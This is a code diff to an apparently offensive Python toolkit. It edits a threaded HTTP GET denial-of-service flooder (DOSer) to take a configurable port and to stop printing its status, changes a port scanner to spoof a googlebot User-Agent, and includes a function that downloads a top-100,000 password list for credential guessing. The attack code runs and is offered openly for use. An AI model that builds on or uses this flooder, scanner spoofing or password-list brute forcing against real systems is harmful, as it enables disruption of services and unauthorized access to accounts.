@@ -124,23 +124,24 @@ class AuthClient:
             return self._login_mechanize()
 
 class DOSer:
-    '''Hits a host with packets from multiple threads.
+    '''Hits a host with GET requests on default port 80 from multiple threads.
     '''
 
     def __init__(self):
         self.target = '127.0.0.1'
+        self.port = 80
         self.threads = 1
         self.payload = '?INTERIORCROCODILEALLIGATORIDRIVEACHEVROLETMOVIETHEATER'
         self.start_time = 0
         self.time_length = 1
 
-    def _attack(self, target, port=80):  
+    def _attack(self, target):  
         # Sends GET requests for time_length duration
         while int(time.time()) < self.start_time + self.time_length:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(1)
             try:
-                s.connect((self.target, port))
+                s.connect((self.target, self.port))
                 s.send("GET /" + self.payload + " HTTP/1.1\r\n")  
                 s.send("Host: " + self.target  + "\r\n\r\n")
             except: pass
@@ -151,17 +152,18 @@ class DOSer:
             self._attack(self.worker)
             self.q.task_done()
 
-    def launch(self, host, duration, threads = 1, payload = 'default'):
+    def launch(self, host, duration, threads = 1, port = 80, payload = 'default'):
         '''Launches threaded GET requests for (duration) seconds.
         '''
         self.target = host
+        self.port = port
         self.threads = threads
         self.start_time = int(time.time())
         self.time_length = duration
         if payload != 'default': self.payload = payload
         # Creates queue to hold each thread
         self.q = Queue()
-        print '> Launching ' + str(threads) + ' threads for ' + str(duration) + ' seconds.'
+        #print '> Launching ' + str(threads) + ' threads for ' + str(duration) + ' seconds.'
         for i in range(threads):
             t = threading.Thread(target=self._threader)
             t.daemon = True
@@ -171,6 +173,7 @@ class DOSer:
             self.q.put(worker)
 
         self.q.join()
+        return
 
 class PortScanner:
     '''Scan an IP address using scan(host) with default port range of 1025
@@ -202,8 +205,13 @@ class PortScanner:
             httplist = [80, 81, 443, 1900, 2082, 2083, 8080, 8443]
             if port in httplist:
                 try:
-                    s.send('GET HTTP/1.1 \r\n')
-                    s.send("Host: " + self.IP + "\r\n\r\n")
+                    headers = '''GET /HTTP/1.1
+Host: ''' + self.IP + '''
+User-Agent: googlebot
+Accept: text/html, application/xhtml+xml, application/xml; q=09, */*; q=0.8
+Accept-Language: en-US, en; q=0.5
+Accept-Encoding: gzip, deflate''' + '\r\n\r\n'
+                    s.send(headers)
                     response = s.recv(1024)
                     self.openlist.append(port)
                     if self.verbose:
@@ -266,3 +274,4 @@ def topPasswords(amount):
     url = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_100000.txt'
     passlist = urllib2.urlopen(url).read().split('\n')
     return passlist[:amount]
+
